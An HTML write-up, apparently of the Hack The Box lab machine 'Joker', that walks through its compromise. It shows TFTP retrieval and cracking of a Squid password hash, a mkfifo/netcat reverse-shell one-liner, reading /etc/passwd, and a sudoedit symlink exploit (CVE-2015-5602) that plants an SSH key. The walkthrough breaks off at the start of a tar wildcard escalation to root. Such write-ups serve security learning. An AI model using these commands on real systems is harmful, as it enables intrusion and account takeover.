&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;We can interact with Squid through the proxy retrieving the credentials from TFTP&lt;/li&gt;
  &lt;li&gt;Now we can use those credentials to access the website, discovering a python console&lt;/li&gt;
  &lt;li&gt;Sudo -l allows us to create a symlink with the user Alekos replacing our ssh key in his authorized_keys&lt;/li&gt;
  &lt;li&gt;Using a crontab that copies archives as root, we can insert our reverse shell and become root&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;

&lt;p&gt;We discover on the remote host 2 open TCP ports: 22 SSH and 3128 http-proxy Squid.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 21:08 CEST
Nmap scan report for 10.10.10.21
Host is up (0.046s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.2 - 4.9 (94%), Linux 4.4 (94%), Linux 4.8 (94%), Linux 4.9 (94%), Linux 3.16 (93%), Linux 3.12 (93%), Linux 3.13 or 4.2 (93%), Linux 3.16 - 4.6 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;what-is-squid&quot;&gt;What is Squid?&lt;/h2&gt;

&lt;p&gt;Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages. Squid has extensive access controls and makes a great server accelerator. It runs on most available operating systems, including Windows and is licensed under the GNU GPL.
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/proxy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;recon---http-proxy-squid&quot;&gt;Recon - HTTP-PROXY SQUID&lt;/h2&gt;

&lt;p&gt;Using the IP address I get an error “The requested URL could not be retrieved” when I try to access the site on port 3128.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some basic research shows that this is a general purpose proxy, so the best move is probably to route all connections through this proxy and see what’s being served locally on the machine.&lt;/p&gt;

&lt;h2 id=&quot;portscan-udp&quot;&gt;Portscan UDP&lt;/h2&gt;

&lt;p&gt;We discover on the remote host 2 open UDP ports: 69 TFTP and 5355 llmnr.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sU -oA udp 10.10.10.21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 21:23 CEST
Nmap scan report for 10.10.10.21
Host is up (0.048s latency).
Not shown: 998 closed ports
PORT     STATE         SERVICE
69/udp   open|filtered tftp
5355/udp open|filtered llmnr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;route-with-proxy&quot;&gt;Route with PROXY&lt;/h2&gt;

&lt;p&gt;First we need to set a new proxy route with FoxyProxy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we can connect to ftp://10.10.10.21 using our proxy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get prompted for a username and password which we don’t still know.&lt;/p&gt;

&lt;h2 id=&quot;what-is-tftp&quot;&gt;What is TFTP?&lt;/h2&gt;

&lt;p&gt;Trivial File Transfer Protocol (TFTP) is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host. One of its primary uses is in the early stages of nodes booting from a local area network. TFTP has been used for this application because it is very simple to implement.&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/tftp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;looking-into-tftp&quot;&gt;Looking into TFTP&lt;/h2&gt;

&lt;p&gt;According to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;What is TFTP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;What is Squid&lt;/code&gt; we have to look for squid configuration files.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; tftp 10.10.10.21
tftp&amp;gt; get /etc/squid/squid.conf
Received 295428 bytes in 49.2 seconds 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The recovered configuration file is full of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; characters, so we will have to clean it to read the active configurations on squid.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; cat squid.conf | grep -v ^\#|grep .
acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access deny manager
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
auth_param basic realm kalamari
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
refresh_pattern .               0       20%     4320 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The files reveal an interesting directory: /etc/squid/passwords&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; tftp 10.10.10.21
tftp&amp;gt; get /etc/squid/passwords
Received 48 bytes in 0.1 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; cat passwords 
kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s find out what kind of password it is:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0

Possible Hashs:
[+] MD5(APR)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; hashcat -m 1600 /root/Documenti/joker/joker /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 4096/10037 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0:ihateseafood
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
Time.Started.....: Sun Apr 26 00:37:29 2020 (11 mins, 1 sec)
Time.Estimated...: Sun Apr 26 00:48:30 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10927 H/s (11.04ms) @ Accel:256 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 7443968/14344385 (51.89%)
Rejected.........: 0/7443968 (0.00%)
Restore.Point....: 7443456/14344385 (51.89%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: ihateteeha -&amp;gt; ihatenikiga

Started: Sun Apr 26 00:37:05 2020
Stopped: Sun Apr 26 00:48:31 2020
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;get-the-access&quot;&gt;Get the access&lt;/h2&gt;

&lt;p&gt;Let’s add the new credentials found on FoxyProxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then let’s connect to our localhost.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now i’m going to bruteforce the web directories to find something interesting.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; dirb http://127.0.0.1 -p 10.10.10.21:3128 -P kalamari:ihateseafood -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Apr 26 02:32:58 2020
URL_BASE: http://127.0.0.1/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: 10.10.10.21:3128
PROXY AUTHORIZATION: kalamari:ihateseafood
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://127.0.0.1/ ----
+ http://127.0.0.1/console (CODE:200|SIZE:1479)                                                                             
==&amp;gt; DIRECTORY: http://127.0.0.1/list/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/images/htb-writeup-joker/joker7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;code-execution&quot;&gt;Code Execution&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a single thread python console. This means that if we execute a wrong command, it will hang and make it impossible to execute other commands. However, if you try placing a reverse shell acting over TCP in the console, you won’t get a connection back. A quick peek at the firewall rules reveals all.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; cat base | base64 -d
# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
*filter
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
COMMIT
# Completed on Fri May 19 18:01:16 2017
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;All the TCP connections are dropped except SSH on 22 and Squid on 3128. So we just have to understand what kind of netcat runs on the remote machine before performing a reverse shell on UDP port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We got OpenBSD netcat so which means we don’t have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; flag. So, we’ll take our reverse shell on PentestMonkey http://pentestmonkey.net/.
&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nc -u -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.21] 53758
/bin/sh: 0: can't access tty; job control turned off
$ id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; pwd 
uid=1000(werkzeug) gid=1000(werkzeug) groups=1000(werkzeug)
werkzeug
/var/www
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-alekos&quot;&gt;PrivEsc to Alekos&lt;/h2&gt;

&lt;p&gt;First of all let’s spawn a full TTY shell with python:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
$ CTRL + Z
$ stty raw -echo
$ fg
$ ls
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take a look on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
lxd:x:107:65534::/var/lib/lxd/:/bin/false
uuidd:x:108:113::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
werkzeug:x:1000:1000::/var/www:
alekos:x:1001:1001:Alekos Gouzouvios,,,:/home/alekos:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ sudo -l
Matching Defaults entries for werkzeug on joker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, sudoedit_follow, !sudoedit_checkdir

User werkzeug may run the following commands on joker:
    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Werkzeug can run commands as Alekos on the remote machine. But if we take a look on the sudo version running on this machine:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ dpkg -l sudo
dpkg -l sudo
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version      Architecture Description
+++-==============-============-============-=================================
ii  sudo           1.8.16-0ubun amd64        Provide limited super user privil
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; searchsploit sudoedit
------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                      |  Path
                                                                                    | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------ ----------------------------------------
(Tod Miller's) Sudo/SudoEdit 1.6.9p21/1.7.2p4 - Local Privilege Escalation          | exploits/multiple/local/11651.sh
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation    | exploits/linux/local/37710.txt
SudoEdit 1.6.8 - Local Change Permission                                            | exploits/linux/local/470.c
------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We will find an exploit for sudo version 1.8.14.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; searchsploit -x exploits/linux/local/37710.txt

# Exploit Title: sudo -e - a.k.a. sudoedit -  unauthorized privilege escalation
# Date: 07-23-2015
# Exploit Author: Daniel Svartman
# Version: Sudo &amp;lt;=1.8.14
# Tested on: RHEL 5/6/7 and Ubuntu (all versions)
# CVE: CVE-2015-5602.

Hello,

I found a security bug in sudo (checked in the latest versions of sudo
running on RHEL and ubuntu) when a user is granted with root access to
modify a particular file that could be located in a subset of directories.

It seems that sudoedit does not check the full path if a wildcard is used
twice (e.g. /home/*/*/file.txt), allowing a malicious user to replace the
file.txt real file with a symbolic link to a different location (e.g.
/etc/shadow).

I was able to perform such redirect and retrieve the data from the
/etc/shadow file.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sudoedit doesn’t check the full path if the code is used twice. Exactly the case we got.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ cd testing/
werkzeug@joker:~/testing$ mkdir bomb
werkzeug@joker:~/testing$ cd bomb
werkzeug@joker:~/testing/bomb$ ln -s /home/alekos/.ssh/authorized_keys layout.html
werkzeug@joker:~/testing/bomb$ ls
layout.html
werkzeug@joker:~/testing/bomb$ sudoedit -u alekos /var/www/testing/bomb/layout.html 
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have to create a new ssh key and paste it to the nano console:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/Documenti/joker/ssh_key
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/Documenti/joker/ssh_key.
Your public key has been saved in /root/Documenti/joker/ssh_key.pub.
The key fingerprint is:
SHA256:5bxxhYd0SNMsXJIK4C5mtPCc4OqukFYMgKglV2RkKNk root@lorenzooo
The key's randomart image is:
+---[RSA 3072]----+
|+o =* ..   o=*o  |
|B Eo .  .  .=*o  |
|.*o . .  ...o.o  |
|..o* +   +.  o   |
|  .oO . S + .    |
| o.o .     +     |
|+.        .      |
|+                |
|+o               |
+----[SHA256]-----+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; cat ssh_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCk4uBt00/4Uh82LxD/3FhgiBL3rKDbENSBEldNKdtdMd6ami2BMnN
lGeIZrApmXh7BoK+xvE2TUlPx5KBtkklvwY7Y45yHUdMJ97Zgk8eUKe2iuQE7p6UweiRDbTZ6Us4vJostkA+q/pxVfu
UlTAKsbZC2ad45AsKZirFeF7qhuh64NWvADPeG6zOQ4DtMHiJsQbcdBVlISPUr/haJ9nKnv23YxO9lBpOVfuUlOHBRJ
2wAq0CuJpu2u3lGQ5TENsy/0PCCxescYxE/aRBXa2H4CO/r+LKXAO1RLGwu1MyN15MI/vYeVOGQfoL4wnB4I+Vxus3q
3Y/DurwZwO6UqI/RByyvH45RA2nZHbn+IGyi8Lyi1ZArWRb7ZXK7d3b9P+lNwCimW5lSMYKFBzXZpOiosu+yBeAFDQH
unpQJ6ptABORE3BOt84kghh7L+Xiww5PkogL76CKa1j62y9a7fHrcQq0WsAGt/3vx0J2rWpBqHZYRfk+KHNc2Fl02pH
QfxGM= root@lorenzooo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; ssh -i ssh_key alekos@10.10.10.21
Welcome to Ubuntu 16.10 (GNU/Linux 4.8.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Sat May 20 16:38:08 2017 from 10.10.13.210
alekos@joker:~$ whoami &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; id &amp;amp;&amp;amp; cat /home/alekos/user.txt
alekos
/home/alekos
uid=1001(alekos) gid=1001(alekos) groups=1001(alekos),1000(werkzeug)
a298121179fe93f2978d3337dbd7057b
alekos@joker:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to Root&lt;/h2&gt;

&lt;p&gt;Inside of alekos’ home directory are two interesting directorys, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;development&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backup&lt;/code&gt; is a folder containing backups of what looks to be the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;development&lt;/code&gt; folder which based off timestamps is running every five minutes. We can also see the tar files are owned by root.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/backup$ ls -lah
total 496K
drwxrwx--- 2 root   alekos  12K Apr 26 18:35 .
drwxr-xr-x 7 alekos alekos 4.0K May 19  2017 ..
-rw-r----- 1 root   alekos  40K Dec 24  2017 dev-1514134201.tar.gz
-rw-r----- 1 root   alekos  40K Dec 24  2017 dev-1514134501.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 17:50 dev-1587912601.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 17:55 dev-1587912901.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:00 dev-1587913201.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:05 dev-1587913501.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:10 dev-1587913801.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:15 dev-1587914101.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:20 dev-1587914401.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:25 dev-1587914701.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:30 dev-1587915001.tar.gz
-rw-r----- 1 root   alekos  40K Apr 26 18:35 dev-1587915301.tar.gz
alekos@joker:~/backup$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since we don’t have any crontab for Alekos, it seems logical that whatever is running the backup is probably running something like tar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cf *&lt;/code&gt;. Yet again another wildcard we can exploit.&lt;/p&gt;

